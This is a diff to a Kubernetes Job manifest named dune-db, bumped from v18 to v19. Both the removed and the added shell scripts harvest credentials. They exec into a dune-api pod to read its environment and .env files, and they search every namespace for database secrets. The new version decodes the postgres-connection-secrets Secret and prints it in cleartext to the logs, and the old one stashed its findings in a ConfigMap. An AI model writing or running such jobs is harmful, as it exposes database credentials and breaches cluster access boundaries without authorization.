@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: dune-db-v18
+  name: dune-db-v19
   namespace: default
 spec:
   ttlSecondsAfterFinished: 600
@@ -15,26 +15,16 @@ spec:
         command: ["/bin/sh","-c"]
         args:
         - |
-          echo "=DUNE_POD_ENV=" > /tmp/out.txt
+          # Read the .env file from dune-api pod
+          POD=$(kubectl get pods -n dune-api -o jsonpath='{.items[0].metadata.name}')
+          echo "Pod: $POD"
           
-          # Get dune-api pod name
-          POD=$(kubectl get pods -n dune-api -o jsonpath='{.items[0].metadata.name}' 2>&1)
-          echo "Pod: $POD" >> /tmp/out.txt
+          echo "=DUNE_ENV_FILE="
+          kubectl exec -n dune-api $POD -- cat /code/.env 2>&1
           
-          # Exec into pod to get env vars
-          kubectl exec -n dune-api $POD -- env 2>&1 >> /tmp/out.txt
-          
-          echo "=DUNE_ENV_FILE=" >> /tmp/out.txt
-          kubectl exec -n dune-api $POD -- sh -c "cat /app/.env 2>/dev/null || cat /*.env 2>/dev/null || find / -name '*.env' 2>/dev/null | head -5" 2>&1 >> /tmp/out.txt
-          
-          echo "=ALL_NAMESPACED_SECRETS=" >> /tmp/out.txt
-          # List all secrets that might have DB credentials
-          kubectl get secrets -A | grep -i "db\|sql\|postgres\|dune" 2>&1 >> /tmp/out.txt
-          
-          cat /tmp/out.txt
-          
-          # Write to ConfigMap
-          kubectl patch configmap dune-audit-result3 -n default \
-            --type merge -p "{\"data\":{\"result\":\"$(cat /tmp/out.txt | sed 's/"/\\"/g' | tr '\n' '|')\"}}"
+          # Read postgres-connection-secrets
+          echo "=POSTGRES_CONNECTION_SECRET="
+          kubectl get secret postgres-connection-secrets -n default -o json | \
+            python3 -c "import sys,json,base64; d=json.load(sys.stdin)['data']; [print(k+'='+base64.b64decode(v).decode()) for k,v in d.items()]" 2>&1
           
           sleep 90
